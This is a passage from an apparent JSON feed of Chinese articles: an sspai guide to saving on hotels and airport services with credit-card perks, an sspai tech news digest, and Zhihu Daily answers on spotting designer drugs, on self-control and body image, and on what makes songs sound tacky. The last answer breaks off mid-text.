区间，那你的选择空间其实非常广阔，各大连锁集团在这个价格区间均有相当出色的产品，例如华住的「全季」、洲际的「智选假日」、希尔顿的「希尔顿花园」等等。再往上，就是所谓的高端酒店范畴了，例如万豪、洲际、希尔顿这些常见的国际连锁品牌里的「万豪」、「皇冠假日」、「希尔顿」、「凯悦」等等。</p>\n<p>我为什么要特意提到这些连锁品牌？因为这些品牌均拥有自己的忠诚会员计划，给予会员优厚的待遇，例如季度促销、积分兑换、以及<s>房间升级、免费早餐等面向高级会员的福利。</s></p>\n<p>于是，这里就出现了节约的可能性了。这些连锁集团会定期推出促销活动，配合这些促销活动，在完成入住后会获得免房券、积分，如果将这些福利折现，你会神奇地发现你的实际入住成本大幅降低。如果你运气足够好，你甚至还会收到定向促销。</p>\n<p>就现阶段的情况而言，洲际的积分兑换非常良心，10000 分的市场公允价值为 330 元左右。以广州为例，当时广州保利洲际酒店的基础房将近 1200 的税后价格，我用之前积攒的 2.5 万积分就可以兑换一晚，超值。洲际的缺点也比较明显，热门酒店的积分房要靠抢，这点不如万豪，只要有基础房就能兑换。</p>\n<p>参考的学习网站：</p>\n<ul>\n<li>\n<a href=\"https://www.flyert.com/forum.php?gid=19\" target=\"_blank\">飞客论坛</a>：酒店板块</li>\n<li>\n<a href=\"https://www.hoteldig.com/\" target=\"_blank\">HotelDig</a>：酒店促销、常客计划攻略等信息</li>\n</ul>\n<h3>酒店：信用卡附赠的免费/折扣入住酒店</h3>\n<p>很多高端信用卡都会拥有免费/折扣入住酒店的权益，如果你恰好拥有，恭喜你。拥有类似权益的有招商「经典白金」、建行「尊享白金」、平安「Safari」、浦发「运通白金」等，都是不错的选择。作为普通打工人，拥有其中的一张即可用极低的价格获得优秀酒店带给你的愉悦感。例如我们在顺德入住的顺德美的万豪酒店，就是用建行的尊享白金权益预定的，只需要 200 元/晚。</p>\n<p>缺点也同样存在：</p>\n<ul>\n<li>很难兑换到节假日</li>\n<li>这些卡片普遍拥有刚性年费/积分兑换免年费</li>\n<li>卡片申请门槛较高，需要拥有一定的存款以及不错的个人收入</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/01/50c0e31f506691e7cfc645b0987d336d.png\"><figcaption>「建行尊享白金」：权益全面，非常适合家用</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/01/384cb6f692ef0933665af084341b34dc.png\"><figcaption>「招商经典白金」：权益稳定全面，不可多得的好卡</figcaption></figure><p>推荐卡片：</p>\n<ul>\n<li>\n<strong>招商银行白金</strong>：拥有 6 次以 300 元起 +100 积分入住高端酒店的权益，里面的酒店价格相比 OTA 平台<sup class=\"ss-footnote\" href=\"\" title=\"编注：Online Travel Agency，即「在线旅行社」，也就是在线酒店、旅游、票务等预订系统平台统称\" footnote-id=\"2\">2</sup>普遍便宜 300 元以上，越高端便宜得越多。</li>\n<li>\n<strong>建行尊享白金</strong>：拥有 2 晚以 200/800 元的价格入住高端酒店。</li>\n<li>\n<strong>平安Safari</strong>：拥有 2 晚以 200/500/800 元的价格入住高端酒店。</li>\n<li>\n<strong>浦发运通白金</strong>：20 万存款加持，可获得一晚免费星级酒店</li>\n</ul>\n<h3>其他手段</h3>\n<ul>\n<li>\n<strong>各类 OTA 房卷</strong>：各大 OTA 在各种购物节日会出售 XXX 元 N 晚的套餐，价格相对日历房<sup class=\"ss-footnote\" href=\"\" title=\"简单理解为平日的标准房价\" footnote-id=\"3\">3</sup>会便宜不少。</li>\n<li>\n<strong>BRG</strong>：Best rate guarantee，最优价格保证，即官方保证自己的价格为全渠道最低价，如果你发现了其他渠道比官网更便宜，你可以通过填写申请来获得额外的折扣。万豪、希尔顿均支持 BRG。我们在日本入住的大阪万豪，就是通过 BRG 获得75折房价，节约了大量的 Money，而节约的 Money 最终又全被我们吃掉了。</li>\n<li>\n<strong>代订</strong>：如果你持有百夫长白金等具备礼宾服务的信用卡，或者入住豪华酒店，你可以请他们帮忙预定米其林等餐厅，省去在淘宝里找代订的繁琐。我们当时通过大阪万豪的礼宾预定了奈良和山村，酒店礼宾非常耐心，通过邮件帮我们完成了预订。如果通过 TB 代订，2 个人我记得是 150 块。</li>\n</ul>\n<h2>如何节省路途时间？</h2>\n<p>坐一次飞机，从出发地到目的地，保底4个小时。如何尽量节约路途时间，留出尽可能多的宝贵体验时间。</p>\n<h3>机场贵宾服务</h3>\n<p><strong>这是我认为最值得拥有的权益。</strong>拥有的途径宽广，门槛极低，拥有它，能够极大提升你坐飞机的舒适程度。对于坐飞机次数不多的普罗大众，获取航司的金银卡难如登天；虽然公务/头等附带的快速安检和优质自营休息室，但高昂的价格摆在那里。拥有一张机场贵宾权益的信用卡也算是另辟蹊径吧。</p>\n<p>机场贵宾服务 「CIP」 有别于「龙腾」、「Priority Pass」所提供的机场贵宾厅服务。前者提供快速/独立安检通道、代办行李托运、代办登机手续，部分机场更提供单独小车送你上飞机；后者主要提供机场的休息室，可在贵宾厅内休息、就餐，依然需要自行安检、托运。</p>\n<p>所以有了 CIP，你无须安检排队，也无须去航司柜台办理登机手续/行李托运，哪怕拖家带口，提前1小时抵达机场足矣。杭州、厦门的小伙伴特别有福气，这两个机场的 CIP 服务体验非常棒，而且支持的银行非常多，门槛也非常低。杭州的话，你只需要拿着卡去柜台完成验证后，就可以翘着二郎腿在沙发上等候登机即可，服务人员会帮你选前排座位、托运行李（行李会打上优先标签）、打印登机牌，登机时间到了使用独立安检通道，接着用小车提前送你上飞机。而享受这些服务的门槛之低超乎想象，几乎所有主流银行都可以使用，尤其是广发、中行。</p>\n<p>而有了「龙腾」、「Priority Pass」，如果匆匆赶到机场没吃饭，刚好可以到休息室蹭一顿，洗个澡。客观的讲，「龙腾」、「Priority Pass」提供的休息室质量参差不齐，好的堪比航司自营休息室，差的则让你怀疑人生。我6月份送外婆去天津，返程从大兴机场回杭州，可以用「龙腾」进入东航的自营 P18 休息室，质量很棒，餐食绝对让机场里的绝大多数餐厅自惭形秽，还可以洗澡，缓解了我奔波一天的疲劳。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/01/19e13257df861ae99e2fd791f1312a53.jpg\"><figcaption>「交行白金」：俗称「白麒麟」，交行卡片真的好看</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/01/695e85001ffbc4d35dfc05c66ea96e8b.png\"><figcaption>「中行无限♾️」：我认为最好看的卡面，Infinite</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/01/a5be621b114ebff05192e5e2f528908e.jpg\"><figcaption>「中行冬奥白金」：5 倍积分、5 次杭州机场 CIP，免年费</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/01/1379cf3bd9e4e0920b89d756052734c0.jpg\"><figcaption>「Priority Pass」：逼格满满的卡面</figcaption></figure><p>推荐卡片：</p>\n<ul>\n<li>\n<strong>交行白金</strong>：6 次 CIP，6点「龙腾」，给办理三张免费附属卡，权益独立，堪称家庭出行的最佳卡片。</li>\n<li>\n<strong>建行尊享白金</strong>：个人无限次 CIP，5次「Priority Pass」。</li>\n<li>\n<strong>招商银行白金以上</strong>：经典白金 6 次可携伴 CIP；钻石/百夫长无限次个人+携伴 1人。</li>\n<li>\n<strong>中行白金以上</strong>：中行的门槛极低，杭州萧山机场只要中行带白金标志的信用卡均可刷1元进入，要知道，中行的白金是滥发的。</li>\n<li>\n<strong>广发鼎极白金卡</strong>：不要看人家名字取得土，但权益是真的香，个人无限次广发自营休息室。</li>\n</ul>\n<h3>接送机</h3>\n<p>接送机最大的意义在于，可以用直达的方式接驳目的地机场与酒店，免去换乘交通工具的麻烦。但银行的很多卡片附带接送机的权益，所以这个权益其实更像是一个帮用户省钱的权益，在拖家带口的情况下，公共交通真的不是最佳选择，不仅费用上不一定有优势，时间上更是完败。</p>\n<p>对比实例：</p>\n<ul>\n<li>\n<strong>公共交通「3H」</strong>：以我们此次的广州之旅来说，如果选择坐大巴去顺德，取完行李  9:30 的我们需要去巴士区等候 10 点的班车，30 分钟等待发车；全程 2 个小时直达顺德，抵达顺德后需要再打车去顺德美的万豪，保守估计 3 小时。</li>\n<li>\n<strong>接送机「1.5H」</strong>：我们通过银行附赠的接送机权益，抵达机场后非常从容地坐上了一辆 Model X，只花了 1.5小时就抵达了酒店，我们还顺便在车上睡了一会儿补充了体力。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/01/5726cd5eecdea3e45c1ab083e619bb83.jpg\"><figcaption>「平安 Safari」：只要不砍权益，值得年费900元。</figcaption></figure><p>卡片推荐：</p>\n<ul>\n<li>\n<strong>平安 Safari</strong>：6 次同城不限距离接送机</li>\n<li>\n<strong>中行钻石</strong>：主卡 2 次接送机+2 次银联钻石接送机，附属卡单独拥有 2次银联钻石接送机</li>\n<li>\n<strong>浦发运通白金：</strong>20万存款加持，5次接送机</li>\n<li>\n<strong>建行尊享白金</strong>：3次接送机</li>\n</ul>\n<h3>自驾</h3>\n<p>对，我极力推荐旅途中自驾。如果你跟我一样在绍兴，杭州机场自驾只需要 45 分钟，如果是 4 天以内的旅行，完全可以白嫖银联白金赠送的免费机场停车。这样你就免去了接送机去机场的费用；而且还获得了灵活选择航班时间的权力，想坐哪一班就坐哪一班。而在目的地，拖家带口的旅行，强烈推荐在当地租车。例如在广州白云机场如果选择租车，你落地就有人给你送车，顺带省掉了接送机的费用，获得媲美生活在原居地的体验。我们在顺德用一嗨租车，2 天 48H 一共才花了 320 块钱，加上 110 块油钱。我们想去哪里去哪里，没有任何限制，玩累了就开车回酒店睡觉，睡醒出来觅食，真的有种我就是顺德土著的错觉。</p>\n<h2>结尾</h2>\n<p>相信看到这里，你或许会不屑的说，这不就是薅羊毛吗？你花了这么多精力、时间，也就这么点收益，还不如多点心思在工作上。对，也不对。</p>\n<ul>\n<li>\n<strong>对的是</strong>，我的确享受了信用卡带来的福利，并积攒了大量的积分用于兑换酒店、航空里程。</li>\n<li>\n<strong>但不对的是</strong>，玩卡如同打游戏，只是一种乐趣。如今已经基本不关注信用卡的小羊毛，佛系用卡的我更看重信用卡本身附带的旅行权益，以及它对效率带来的提升，它无需消耗你大量的精力，却实实在在地帮我节约了我的金钱，让我以极低的价格体验公务舱和豪华酒店；帮我节约了旅途中大量的无效时间，给我留出了更多的旅行时间。</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/01/52b4ebeb9654ce1d1addf909bd23a85c.jpg\"><figcaption>「交行神鹿」：非常美丽的外币卡</figcaption></figure><p>我不是很擅于给他人洗脑安利，本文也只是从自己的体验出发，为大家阐述高阶信用卡能够给旅行带来哪些影响，希望能够给你一点启发，一点收获，那我就很快乐了。</p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a><br> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68036"},{"title":"派早报：Google Pixel 6 系列正式公布、微软发布 Windows 365 云电脑服务等","date":"2021-08-03 00:56:03","description":"\n<h2>你可能错过的新鲜事</h2>\n<h3>Google Pixel 6 系列正式公布</h3>\n<p>8 月 3 日凌晨，Google 通过官网网站及社交媒体公布 Pixel 6 系列的外观设计及配置参数。其中 Pixel 6 提供橙、绿、黑 3 种配色可选，机身采用与 Pixel 4 系列相似的磨砂中框设计，Pixel 6 Pro 提供黄、白、黑 3 种配色可选，后置摄像头模组上方区域较 Pixel 6 而言更大；屏幕方面，Pixel 6 采用 6.4 英寸、 90Hz 刷新率、FHD+ 分辨率直屏，Pixel 6 Pro 采用 6.7 英寸、120Hz 刷新率、QHD+ 分辨率曲面屏；相机方面，Pixel 6 后置搭载超广角镜头双摄，Google Pixel 6 Pro 额外配备一枚支持 4 倍光学变焦的长焦镜头，两款机型主摄均为采用新款传感器的广角镜头，据称相比前代能够提供 150% 的进光量。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4495vtb34tarbb3pjqg.png\"></figure><p>硬件配置方面，Google 确认 Pixel 6 将全系搭载全新的 Tensor SoC，目前已知 Tensor SoC 将集成用于处理 AI 任务的 TPU 芯片和 Titan M2 安全芯片，但 Google 并未公布 CPU、GPU 的相关细节。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c449605b34tar6a1oqh0.jpeg\"></figure><p>Google Pixel 6 系列将于今年秋季正式推出，届时将在澳大利亚、加拿大、日本、中国台湾、美国等 8 个国家和地区发售。<a href=\"https://store.google.com/us/magazine/google_pixel_6\" target=\"_blank\">来源</a></p>\n<h3>微软发布 Windows 365 云电脑服务</h3>\n<p>8 月 2 日，微软此前发布的 Windows 365 云电脑服务正式开售。该服务旨在为商业用户提供远程工作支持，可以通过浏览器获得即开即用、多设备兼容的 PC 体验。定价方面，每位用户根据不同配置与系统要求每月 20 美元到 158 美元不等，最高可提供 8 vCPU、32GB RAM、512GB 存储的配置。<a href=\"https://www.microsoft.com/en-us/windows-365/business/compare-plans-pricing\" target=\"_blank\">来源</a></p>\n<h3>Google 服务将放弃对旧版 Android 的支持</h3>\n<p>外媒 91Mobile 近日发现 Google 将会从 9 月 27 日后禁止 Android 2.3.7 或更早的系统登录 Google 旗下的 App 服务，即无法通过这些系统内置的 Google 服务 App 继续使用相关服务，但依旧可以通过网页端开进行访问，而 Google 在给用户的信函中表示该决定则是出于保护用户隐私，但并未具体说明哪里存在泄露隐私的问题。<a href=\"https://cn.engadget.com/google-ends-sign-in-support-for-old-android-versions-070047798.html\" target=\"_blank\">来源</a></p>\n<h3>梅赛德斯奔驰和宝马召回部分进口和国产汽车</h3>\n<p>8 月 2 日，梅赛德斯-奔驰（中国）汽车销售有限公司、北京奔驰汽车有限公司根据《缺陷汽车产品召回管理条例》和《缺陷汽车产品召回管理条例实施办法》的要求，向国家市场监督管理总局备案了召回计划，计划召回生产日期在 2016 年 9 月 20 日至 2021 年2 月 27 日期间的部分进口和国产 A 级、C 级、E 级、S 级、GLA SUV、GLB SUV、GLC SUV、GLE SUV、G 级车辆，这些车辆的模块软件可能已停用。若发生事故，包括手动和自动功能的紧急呼叫服务将无法使用，可能导致救援延迟，存在安全隐患。同时自 2022 年 4 月 29 日起，召回生产日期在 2019 年 5 月 14 日至 2020 年 2 月 18 日期间的部分进口 GLE SUV 车辆，共计 3329 辆，这些车辆的控制单元电路板组件存在工艺偏差，造成左后倒车灯控制单元可能不符合规范。导致左后倒车灯可能会常亮，不符合国家相关强制性标准的要求，存在安全隐患。<a href=\"http://www.samr.gov.cn/zw/zh/202108/t20210802_333289.html\" target=\"_blank\">来源</a></p>\n<p>同时宝马（中国）汽车贸易有限公司根据《缺陷汽车产品召回管理条例》和《缺陷汽车产品召回管理条例实施办法》的要求，向国家市场监督管理总局备案了召回计划，召回2005 年 2 月 17 日至 2017 年 8 月 27 日期间生产的部分进口宝马 1 系、2 系、3 系、4 系、5 系、X1、X3、X4、X5、X5 M、X6、X6 Active Hybrid 车辆，共计 8097 辆，这些车辆的安全气囊装配了高田公司生产的含有硝酸铵药剂，由于在防潮方面存在不完善，在气囊打开时气体发生器可能发生异常破损，导致碎片飞出，伤及车内人员，存在安全隐患，宝马将为召回范围内的车辆免费更换所涉及部位的气囊气体发生器，以消除安全隐患。<a href=\"http://www.samr.gov.cn/zw/zh/202108/t20210802_333288.html\" target=\"_blank\">来源</a></p>\n<h3>Redmi Note 10 JE 正式发布</h3>\n<p>8 月 2 日，小米正式发布了 Redmi Note 10 JE（Japan Edition）特别版本，该设备搭载高通骁龙 480 处理器，配备了 6.5 英寸 90Hz FHD+ 屏幕。续航方面，采用了 4800mAh 电池，支持 18W 充电。该手机本次通过 AU 和 UQ Mobile 运营商渠进行售卖，提供银、灰两种颜色，售价 28765 日元。<a href=\"https://www.gsmarena.com/the_redmi_note_10_japan_edition_is_the_first_in_the_series_with_a_snapdragon_480_and_ip68_rating-news-50338.php\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44960db34tasob6hrfg.png\"></figure><h3>索尼发布 Vlog 微单相机 ZV-E10</h3>\n<p>8 月 2 日，索尼（中国）正式发布新款 Vlog 微单相机 ZV-E10。该机型采用 APS-C 画幅 CMOS，有效像素约 2420 万，支持 4K 视频录制、1080p 120 帧慢动作等模式。机身重量约 343g，带有侧翻式液晶屏、多功能热靴及 3.5mm 麦克风接口。ZV-E10 将于八月初开售，单机身定价 4699 元，变焦镜头套装 5299 元。<a href=\"https://mp.weixin.qq.com/s/ccjcB5NEJpmxCUsWxLf5gw\" target=\"_blank\">来源</a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c44960lb34tar307ksh0.png\"></figure><h2>看看就行的小道消息</h2>\n<ul>\n<li>在马来西亚的 SRIM 数据库中发现了一款新的小米智能手机，该机型名称标注为 小米 11T Pro，对应的还有普通的 小米 11T 机型，两者可能只有相机上的差距，但均预装MIUI 12.5 系统，另外国内的微博博主 @数码闲聊站 则表示小米 11T 系列将很快在海外上市，相比去年的小米 10T ，屏幕将从 144Hz LCD 迭代成 120Hz OLED。<a href=\"https://www.ithome.com/0/566/710.htm\" target=\"_blank\">来源</a>\n</li>\n<li>据爆料者 @FrontTron 在其个人 Twitter 上爆料称，即将发售的三星 Galaxy Fold 3 在绝大多数市场推出的将会是 12GB 运存 + 512GB 内置存储的配置组合，唯独在中国将推出一款 16GB 运存 + 512GB 内置存储的豪华配置版本，根据此前的爆料，三星 Galaxy Fold 3 的 512GB 版本售价为 2099 欧元。<a href=\"https://www.ithome.com/0/566/711.htm\" target=\"_blank\">来源</a>\n</li>\n<li>据外媒消息报道，Windows CoreOS 11 系统构建版本已开始进行测试，并放出相关视频信息。<a href=\"https://www.youtube.com/watch?v=6446RxFqvdE\" target=\"_blank\">来源</a>\n</li>\n</ul>\n<h2>少数派的近期动态</h2>\n<p><strong>📰 内容动态</strong></p>\n<ul>\n<li>🚗 由少数派数字工具组联合非旭和老麦制作的《特别少数派·中国西部游自驾指南》现已 <a href=\"http://west.sspai.com/\" target=\"_blank\">上线</a>。</li>\n<li>🌟 少数派会员通讯《<a href=\"https://sspai.com/prime/precog\" target=\"_blank\">职场生存手册</a>》已经上线，带你关注职场的生存法则与自我保护。</li>\n<li>📕 由少数派编辑部联合优秀作者出版的实体书《数字时代的效率手册》已经印刷完毕，即将上线各大电商平台，少数派预购会员均将获赠该书。</li>\n<li>📷️ 聊聊你最爱的那枚镜头，去 <a href=\"https://sspai.com/bullet/1627633392\" target=\"_blank\">一派</a> 和大家交流一下摄影心得吧。</li>\n</ul>\n<p><strong>💰 折扣促销</strong></p>\n<ul>\n<li>💿 Microsoft 365 <a href=\"https://item.taobao.com/item.htm?id=638827544500\" target=\"_blank\">限时促销</a>，下单再送定制鼠标垫。</li>\n<li>⚙️ 工具升值包、付费栏目限时 <a href=\"https://sspai.com/post/67817\" target=\"_blank\">特惠加上新</a>，开启你的暑假充电计划。</li>\n<li>💻 少数派商店 Satechi 苹果周边配件 <a href=\"https://sspai.com/post/67873\" target=\"_blank\">限时特惠</a> 中，几款「果味儿」十足的第三方配件。</li>\n</ul>\n<h2>你可能错过的文章</h2>\n<ul>\n<li>📡 <a href=\"https://sspai.com/post/68037\" target=\"_blank\">家庭网络中的「NAT」到底是什么？</a>\n</li>\n<li>🚑 <a href=\"https://sspai.com/post/68024\" target=\"_blank\">暴雨和洪涝的季节，这些技巧助你从容自保</a>\n</li>\n<li>💄️ <a href=\"https://sspai.com/post/67788\" target=\"_blank\">国物馆 | 推荐给每一个精致女孩的国产美妆和护肤</a>\n</li>\n<li>⭐️️ <a href=\"https://sspai.com/post/68057\" target=\"_blank\">派评 | 近期值得关注的 App</a>\n</li>\n</ul>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p> </p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68066"},{"title":"如何分辨第三代毒品？有哪些细节需要警惕？","date":"2021-08-02 23:07:32","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/9b523c9820e64acf96dc724332a53319_l.jpg?source=8673f162\"><span>陈敏，</span><span>不必对我写的东西耿耿于怀，如果觉得有错，那证明你是对的。</span>\n<a href=\"https://www.zhihu.com/question/476646671/answer/2033998186\" hidden>阅读原文</a>\n</div>\n<div>\n<p>托某位入狱流量明星的福，让大家开始关注新型毒品，避免更多人上当受骗，也算是做了一个好事。第三代毒品是根据时间来划分的，此前有海洛因为代表从植物提取合成的第一代毒品，以以冰毒、麻古为代表的第二代化学人工合成毒品。</p>\n<p>第三代毒品是第二代毒品的变种，即地下毒贩为逃避打击而在第 2 代毒品的化学结构式进行修改，合成出一种与第二代毒品相似或更强的兴奋、致幻、麻醉等效果的毒品类似物。由于无法确定名字，所以被统称为“实验室毒品”或“策划药”。</p>\n<p>首次出现是在 2013 年联合国禁毒署的《世界毒品报告》，里面定义新精神活性物质：<strong>没有被联合国国际公约管制，但存在滥用可能，并会对公众健康造成危害的单一物质或混合物质。随后联合国禁毒署认为“新精神活性物质”将成为全球范围流行的第三代毒品。</strong></p>\n<p>第三代毒品刚开始出现的时候，由于成分与以往毒品不同，再加上检查手段未跟上，很多国家并没有意识这是一种新型毒品，所以被毒贩们钻了法律空子，很快就替代原来法律风险较大的第 2 代化学合成毒品，在全球流行开来。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-5f63df073a31fdfcbd7f4378eb5c876d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>由于制作方便，简单，第三代毒品不仅种类多，且迭代更新速度异常迅猛，据联合国的报告显示，新精神活性物质 2009 年 166 种，2012 年上升到 251 种，2014 年达 388 种，2018 年陡增到 602 种，年增长幅度达到了 55%。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fe80cd882d7ed7309b203af70678cf0e_720w.jpg?source=8673f162\" alt=\"\"></figure><p>除此之外，一些不法分子更是丧心病狂的将第 3 代新型毒品伪装成“网红饮料”、“奶茶”、“跳跳糖”、“巧克力”、“曲奇饼干”、“果冻”等，在娱乐场所公然销售。</p>\n<p>从目前了解的情况来看，第三代毒品比前几代毒品具有更鲜明，更易传播，更隐蔽的特点：</p>\n<ul><li><strong>个性定制</strong></li></ul>\n<p>互联网时代讲究用户体验，这点毒贩也与时俱进，根据地区、用户需要，以及躲避各国法律管制，定制不同外观、药性的新精神活性物质，各国缉毒部门防不胜防。目前此类新精神活性物质的制作方法并不神秘，具有一定的有机化学基本知识或是受过初级药剂师专业培训，都可以通过互联网传授模式制作出来。</p>\n<ul><li><strong>隐蔽性强</strong></li></ul>\n<p>由于缺乏对新精神活性物质的了解，各国基本禁毒人员对此类毒品所知有限，以及法律的管制滞后，很难将收缴上来的新活性精神物质判断为毒品。而一些青少年在娱乐场将一些“神仙水”、“开心水”等新精神活性物质作为一件新奇潮流的事物，更愿意通过这些获得所谓的“合法快感”、“适度兴奋”等。</p>\n<ul><li><strong>易于传播</strong></li></ul>\n<p>互联网的发达，也给毒品的流通创造了条件，法律规定的化学合成毒品风险极大，而新精神活性物质具有易溶、无色等物理特性，毒贩只需要将它添加到普通物品，如饮料、矿泉水，使用快递包装运送即可，给目前禁毒稽查造成了很大的压力。</p>\n<p>但从药物作用机理上讲，第三代毒品与前两代毒品一样，滥用后会对人的身心健康造成的损害很大。例如, 以合成大麻素为主要成分的某种新型香料毒品， 使用该物质经常出现的临床症状有<strong>高血压、晕厥、心动过速、幻觉、精神错乱、低钾血症、癫痫和惊恐发作</strong>等, 有些并不是吸食大麻时所具有的典型临床症状。</p>\n<p>此外, 吸食此类新型香料毒品还可引起<strong>药物依赖性和精神分裂症</strong>的发生。又如, 临床观察表明, 吸食合成卡西酮的最普遍症状是焦虑，小到轻微焦虑大到严重的精神疾病。与前两代毒品一样，最严重的后果依旧是致死率，2004 年到 2008 年之间， 欧洲报道了 6 起与吸食哌嗪类新精神活性物质有关的死亡事件。</p>\n<p>前两年流行的小树枝毒品，就是一种合成大麻素类的新活性精神物质，其吸食效果与传统大麻类似（或更强）。另外还比较知名的就是被称之为丧尸药物的“甲卡西酮”，以及在一些在娱乐场不法分子用来<strong>迷奸的“蓝精灵”、“神仙水”、“开心水”</strong>等毒品，都属于新活性精神物质。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-480ca43d43c6940a35c46b96abd38889_720w.jpg?source=8673f162\" alt=\"\"></figure><p>联合国禁毒署所确定的新精神活性物质已经在全球范围内形成不同程度的滥用危害。这些有的已经被部分国家列管为毒品, 有的则游离在各国毒品管制措施之外。毒品犯罪分子利用各国毒品管制活动的滞后性和差异性，不断发掘推出新的第 3 代毒品, 并通过制造和贩运活动推广到世界各地。</p>\n<p>尽管第 3 代新型毒品可以“千变万化”，但原理和危害万变不离其宗，即让吸食者产生欣快、致幻、麻醉等感受，同时也在伤害其生理健康，尤其是对神经、精神系统的损害比上两代毒品还要严重。</p>\n<p>所以，想要避免第 3 代新型毒品的侵害，就得提高警惕，无论是在娱乐场所，还是在生活中，不接受、不购买陌生人、刚认识的朋友推荐的“上头电子烟”、“网红饮料”和“毒品零食”！</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/476646671\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738795"},{"title":"怎样看待「身材都无法控制，还如何控制人生」这句话？","date":"2021-08-02 23:07:26","description":"<div>\n<div>\n<div>\n<img src=\"https://pic1.zhimg.com/v2-f57fa1c6aad9bfb2b5ef78a40d374639_l.jpg?source=8673f162\"><span>温绚，</span><span>她认出风暴而激动如大海</span>\n<a href=\"https://www.zhihu.com/question/48227005/answer/110467765\" hidden>阅读原文</a>\n</div>\n<div>\n<p>用强大的自控力压抑欲望时，一方面会伴随自我膨胀式的快感：仿佛未来是可受『我』意志主宰的，『我的人生』是被『我』控制的；另一方面却会对那个刻意束缚生命之流的自己升起一股厌恶。</p>\n<p>因为我内心的某处明白，『我能控制我的人生时』这句话的前提是『我』必须已经和『我的生命』割裂开了。若没有主客之分，一个事物又怎能控制另一个事物？当我企图通过控制力逆转生命自发的流动时，是企图通过割裂『自我 - 生命』的联结达到『自我』的目的；而自我本是生命的投影，逆流割离出的『自我』，像河流中紧握着河水的漩涡，终将归于流水的方向。</p>\n<p>起初，控制欲倚赖着自我膨胀的快感所向披靡。直到内心的声音被压抑了太久，你慢慢发现，你不再能控制你的控制欲了 --- 你被你的控制欲控制了！它像梦靥般萦绕，以 obsessive 的形式一遍遍重演，你才意识到你离源头已很远了。当海浪抗拒海的方向，便再也无法好好拥抱自己。</p>\n<p>『身材都无法控制，还如何控制人生』，说这句话的人恐怕不知道 binge eating 和 bulimia nervosa 患者有着多么强烈的控制欲，不知道抑郁症患者有多想控制自己的心境，不知道 OCD 患者正是因为太想控制才无法自控。天知道他们比常人还要千百倍想过好这个人生啊。</p>\n<p>我曾是个对一切都想抓住的人，那时的我只为攀登一个又一个山峰，从不在乎山上的风景。在很长的一段时间里，我将生命视作筹码，将愉悦视作阻碍。无疑，一个人需要花费更多时间来看清这些压力本身: 我是谁，我要的是什么？而我真正想要的又是什么？若没经历过那些自我压力，我不会明白过度的自控力是对生命本身的扼制。</p>\n<p>说真的，靠控制来的东西，总是要还的。只不过看你能不能修得过这一收一放的功课。</p>\n<p>后来，我在博客里写下：</p>\n<blockquote>而那个漩涡已死；把一直紧握的水归还给河流<br><br>以前，盐不知味，不以为盐。<br><br>原来，一切就是刚刚好。</blockquote>\n<p>愿生命通过你活出来。</p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/48227005\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9738782"},{"title":"听起来就觉得俗气的歌曲有什么特点？","date":"2021-08-02 23:07:18","description":"<div>\n<div>\n<div>\n<img src=\"https://pic2.zhimg.com/v2-edabbdfed6f5ae034fd2caa2f0376ebc_l.jpg?source=8673f162\"><span>周雨思Yusi，</span><span>知名音乐博主；音乐审美通识教育践行者</span>\n<a href=\"https://www.zhihu.com/question/42224014/answer/2034360718\" hidden>阅读原文</a>\n</div>\n<div>\n<p>说起“土味”歌曲，在华语乐坛里，凤凰传奇或许首当其冲。他们的音乐朗朗上口，非常接地气，再加上与广场舞密不可分的联系，导致大家一提起他们的音乐，就是一种感觉——“土”。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-6d52c2997d6998f064b722fe3b9caf78_720w.jpg?source=8673f162\" alt=\"\"></figure><p>当然，其实早在凤凰传奇之前，土味歌曲就在中国诞生了。</p>\n<p>从那英吐槽“只有农民才听”的《2002 年的第一场雪》，到一度广为传唱的《两只蝴蝶》《老鼠爱大米》等土味情歌，很长一段时间以来，大家一边吐槽着这些音乐的“土”，一边又不断被这些旋律洗脑。近几年来，《野狼 